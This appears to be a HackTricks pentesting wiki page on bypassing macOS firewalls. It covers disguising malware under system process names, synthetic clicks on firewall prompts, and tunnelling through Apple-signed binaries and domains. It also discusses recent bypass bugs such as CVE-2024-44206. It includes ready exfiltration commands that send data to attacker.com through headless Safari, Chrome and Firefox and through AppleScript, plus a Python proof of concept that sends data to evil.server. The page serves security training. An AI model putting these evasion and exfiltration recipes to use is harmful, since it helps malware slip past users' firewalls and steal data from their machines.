# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

- For example calling the malware with names of well known macOS processes like **`launchd`**

### Synthetic Click

- If the firewall ask for permission to the user make the malware **click on allow**

### **Use Apple signed binaries**

- Like **`curl`**, but also others like **`whois`**

### Well known apple domains

The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them

```bash
lsof -i TCP -sTCP:ESTABLISHED
```

### Abusing DNS

DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Browser apps

- **oascript**

```applescript
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```

- Google Chrome

```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```

- Firefox

```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```

- Safari

```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```

### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
In July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web content filter” used by Screen Time parental controls.
A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.

Practical test (un-patched system):

```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```

### Packet Filter (PF) rule-ordering bug in early macOS 14 “Sonoma”
During the macOS 14 beta cycle Apple introduced a regression in the userspace wrapper around **`pfctl`**.
Rules that were added with the `quick` keyword (used by many VPN kill-switches) were silently ignored, causing traffic leaks even when a VPN/firewall GUI reported *blocked*. The bug was confirmed by several VPN vendors and fixed in RC 2 (build 23A344).

Quick leak-check:

```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```

### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.

Example proof-of-concept (pre-11.2):

```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```

---

## Tooling tips for modern macOS

1. Inspect current PF rules that GUI firewalls generate:
   ```bash
   sudo pfctl -a com.apple/250.ApplicationFirewall -sr
   ```
2. Enumerate binaries that already hold the *outgoing-network* entitlement (useful for piggy-backing):
   ```bash
   codesign -d --entitlements :- /path/to/bin 2>/dev/null \
       | plutil -extract com.apple.security.network.client xml1 -o - -
   ```
3. Programmatically register your own Network Extension content filter in Objective-C/Swift.  
   A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s **LuLu** source code.

## References

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
